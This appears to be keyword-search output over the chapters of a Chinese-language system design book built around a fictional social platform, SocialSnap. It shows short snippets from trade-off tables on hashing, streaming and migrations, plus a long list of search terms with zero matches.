  c28_b14.md: ...终；名人近实时 | 高 | 高——阈值管理、两条代码路径 **Consistent hashing + virtual nodes** (Ch 26) | 无延迟成本 | N/A | 极高（变更时最小扰动） | 中 **N/W/R quorum (d...

=== pipeline (1 occurrences) ===
  c28_b14.md: ...最终（网络持续被抓取） | 高（分布式爬虫） | 高——礼貌性、去重、优先队列 **Video transcoding pipeline** (Ch 24) | 高（离线批量；非实时） | 最终（上传到可用有延迟） | 高（队列缓冲故障） | 高——编解码...

=== ranking (1 occurrences) ===
  c28_b14.md: ...迟极低（预计算） | 最终（新文档出现前有索引延迟） | 高（复制分片） | 高——分片管理、重索引 **TF-IDF ranking** (Ch 23) | 无查询延迟开销（分数预计算） | N/A | N/A | 中——语料变化时重算分数 **Pag...

=== shortening (1 occurrences) ===
  c28_b14.md: ...y Impact | Operational Complexity ---|---|---|---|--- **URL shortening (redirect)** (Ch 20) | 极低（键查找 + 重定向） | 最终（短 URL → 长 URL 映射）...

=== streaming (1 occurrences) ===
  c28_b14.md: ...到可用有延迟） | 高（队列缓冲故障） | 高——编解码配置、并行 worker **Adaptive bitrate streaming (ABR)** (Ch 24) | 极低（客户端算法） | N/A | 极高（优雅降级） | 中（manifest 和...

=== transcoding (1 occurrences) ===
  c28_b14.md: ...23) | N/A | 最终（网络持续被抓取） | 高（分布式爬虫） | 高——礼貌性、去重、优先队列 **Video transcoding pipeline** (Ch 24) | 高（离线批量；非实时） | 最终（上传到可用有延迟） | 高（队列缓冲故障）...

=== virtual (1 occurrences) ===
  c28_b14.md: ...| 普通用户最终；名人近实时 | 高 | 高——阈值管理、两条代码路径 **Consistent hashing + virtual nodes** (Ch 26) | 无延迟成本 | N/A | 极高（变更时最小扰动） | 中 **N/W/R quo...

=== infrastructure (1 occurrences) ===
  c28_b15.md: ...mortems** (Ch 28) | N/A | N/A | 随时间改善（从失败中学习） | 低——只需流程纪律 **Infrastructure as Code** (Ch 28) | N/A | 基础设施状态确定性 | 极高（可复现环境） | 中——IaC 工具...

=== microservice (1 occurrences) ===
  c28_b15.md: ...ility Impact | Operational Complexity ---|---|---|---|--- **Microservice decomposition (Conway's Law)** (Ch 13, 28) | 服务间更高；支持独立扩展 |...

=== technical (1 occurrences) ===
  c28_b15.md: ...e flags (deployment)** (Ch 18, 27) | 无延迟影响 | N/A | 极高 | 中 **Technical debt (intentional)** (Ch 27) | N/A | N/A | N/A | 不主动管理则随时间增...

=== debt (1 occurrences) ===
  c28_b15.md: ...eployment)** (Ch 18, 27) | 无延迟影响 | N/A | 极高 | 中 **Technical debt (intentional)** (Ch 27) | N/A | N/A | N/A | 不主动管理则随时间增长...

=== decomposition (1 occurrences) ===
  c28_b15.md: ...| Operational Complexity ---|---|---|---|--- **Microservice decomposition (Conway's Law)** (Ch 13, 28) | 服务间更高；支持独立扩展 | 服务间最终 | 更高——部...

=== migration (1 occurrences) ===
  c28_b15.md: ...低（代码靠近用户） | 有限（无中央 DB 访问） | 极高 | 中——边缘部署流水线 **Strangler fig migration** (Ch 27) | 无延迟影响 | N/A | 极高（渐进；始终可逆） | 高——必须维护并行系统 **Canar...

=== tech (1 occurrences) ===
  c28_b17.md: ...记得每个重大设计决策及其当时正确的上下文。  工程团队组织成 8 个（8）服务团队，每个团队 8–12 名工程师和一名 tech lead。每个团队维护自己的服务、自己的数据库（遵循微服务原则的服务自有数据）和自己的 on-call 轮值。服务失败...

=== designed (1 occurrences) ===
  c28_b18.md: ...的 API 契约）。另一个具体例子：如果一家公司的计费团队和产品团队很少沟通，计费系统和产品系统通常会有 poorly designed 集成——每方对另一方的约束和需求只有模糊理解，集成 bug 出现在与沟通缺口匹配的接口上。  **Q2.** Serv...

=== poorly (1 occurrences) ===
  c28_b18.md: ...队拥有的系统间的 API 契约）。另一个具体例子：如果一家公司的计费团队和产品团队很少沟通，计费系统和产品系统通常会有 poorly designed 集成——每方对另一方的约束和需求只有模糊理解，集成 bug 出现在与沟通缺口匹配的接口上。  **Q...

=== served (1 occurrences) ===
  c28_b19.md: ...除后，Redis timeline 必须失效。若失效失败（竞态、网络错误），Redis 会在 TTL 秒内把已删除帖子 served 给用户。两个系统的权衡直接冲突：Redis 的速度来自不等待持久化确认；PostgreSQL 的正确性正来自等待。系统...

=== etl (1 occurrences) ===
  c28_b21.md: ...出。5. 退出策略？TimescaleDB 数据存在 PostgreSQL 中；可通过标准 SQL 访问。迁移出去需要 ETL，但是可行的。退出策略良好。6. 还有谁在规模上运行？TimescaleDB 已被多家大公司大规模使用。公开的案例研究和...

=== familiar (1 occurrences) ===
  c28_b21.md: ...的案例研究和 post-mortem 可获得。建议：采纳 TimescaleDB。它解决真实问题，故障模式可接受，运营 familiar，退出策略清晰。  **Q3.** SocialSnap 经历了一次 45 分钟（45-minute）故障：数据库迁移意...

=== dry (1 occurrences) ===
  c28_b22.md: ...E` 或 `DROP COLUMN` 的迁移需要 senior 工程师的第二次批准才能合并。(4) **在生产中预迁移 dry-run**（负责：Platform 团队，期限：3 周）：实现迁移影子模式，先在生产副本上运行迁移 SQL 并分析查询...

=== paradoxically (1 occurrences) ===
  c28_b23.md: ...集成失败和事件。沟通成本后来在生产中支付，风险高得多。如果团队过度沟通，会造成官僚开销，拖慢决策、让工程师沮丧，并可能 paradoxically 产出更低质量工作，因为会议取代了思考。解决之道是结构性的：用架构选择最小化持续沟通需求。稳定、文档良好的服务接口意味着...

=== brief (1 occurrences) ===
  intro.md: ...一样收集需求，形成假设，排除不可能，然后选择“最不错误”的答案。案例研究章节（第五部分）以一份“Detective's Brief（侦探简报）”开篇，把需求呈现为一个谜题——而这正是真实工程团队设计讨论的实际方式。  最后一章跳出架构，审视人的层面：...

=== discipline (1 occurrences) ===
  intro.md: ...每做一个重大架构决策就增加一行。到第 28 章，它已成为每位资深工程师脑中携带的完整权衡速查卡。Detective's Discipline（侦探式纪律）这条线索把系统设计框定为基于证据的推理：像收集线索一样收集需求，形成假设，排除不可能，然后选择“最不错误”...

=== backed (1 occurrences) ===
  intro.md: ...为全球分布式服务：sharded databases（分片数据库）、circuit breakers（熔断器）、CDN-backed video delivery（由 CDN 支持的视频分发），以及 200 台由 Terraform 管理的服务器。你会...

=== breakers (1 occurrences) ===
  intro.md: ...个 Python 函数开始，逐章演进为全球分布式服务：sharded databases（分片数据库）、circuit breakers（熔断器）、CDN-backed video delivery（由 CDN 支持的视频分发），以及 200 台由 Ter...

=== databases (1 occurrences) ===
  intro.md: ...Snap，一个虚构的社交平台。它从笔记本电脑上的一个 Python 函数开始，逐章演进为全球分布式服务：sharded databases（分片数据库）、circuit breakers（熔断器）、CDN-backed video delivery（由 CD...

=== sharded (1 occurrences) ===
  intro.md: ...是 SocialSnap，一个虚构的社交平台。它从笔记本电脑上的一个 Python 函数开始，逐章演进为全球分布式服务：sharded databases（分片数据库）、circuit breakers（熔断器）、CDN-backed video del...

=== password (0 occurrences) ===

=== idx (0 occurrences) ===

=== followed (0 occurrences) ===

=== following (0 occurrences) ===

=== avatar (0 occurrences) ===

=== image (0 occurrences) ===

=== joined (0 occurrences) ===

=== neo (0 occurrences) ===

=== prod (0 occurrences) ===

=== warranty (0 occurrences) ===

=== years (0 occurrences) ===

=== abc (0 occurrences) ===

=== xyz (0 occurrences) ===

=== friend (0 occurrences) ===

=== eavschema (0 occurrences) ===

=== updated (0 occurrences) ===

=== clinical (0 occurrences) ===

=== drug (0 occurrences) ===

=== ended (0 occurrences) ===

=== insurance (0 occurrences) ===

=== notes (0 occurrences) ===

=== started (0 occurrences) ===

=== actor (0 occurrences) ===

=== evt (0 occurrences) ===

=== target (0 occurrences) ===

=== expires (0 occurrences) ===

=== reset (0 occurrences) ===

=== int (0 occurrences) ===

=== last (0 occurrences) ===

=== generate (0 occurrences) ===

=== serve (0 occurrences) ===

=== signed (0 occurrences) ===

=== dramvs (0 occurrences) ===

=== hddvs (0 occurrences) ===

=== ssdvs (0 occurrences) ===

=== vid (0 occurrences) ===

=== sess (0 occurrences) ===

=== local (0 occurrences) ===

=== premium (0 occurrences) ===

=== current (0 occurrences) ===

=== upgrade (0 occurrences) ===

=== pool (0 occurrences) ===

=== authors (0 occurrences) ===

=== validate (0 occurrences) ===

=== input (0 occurrences) ===

=== allowed (0 occurrences) ===

=== client (0 occurrences) ===

=== granted (0 occurrences) ===

=== revoked (0 occurrences) ===

=== scopes (0 occurrences) ===

=== uris (0 occurrences) ===

=== conversation (0 occurrences) ===

=== deleted (0 occurrences) ===

=== participants (0 occurrences) ===

=== sender (0 occurrences) ===

=== weight (0 occurrences) ===

=== extract (0 occurrences) ===

=== seed (0 occurrences) ===

=== arriving (0 occurrences) ===

=== unbilled (0 occurrences) ===

=== billing (0 occurrences) ===

=== ledger (0 occurrences) ===

=== allocated (0 occurrences) ===

=== backup (0 occurrences) ===

=== instance (0 occurrences) ===

=== period (0 occurrences) ===

=== retention (0 occurrences) ===

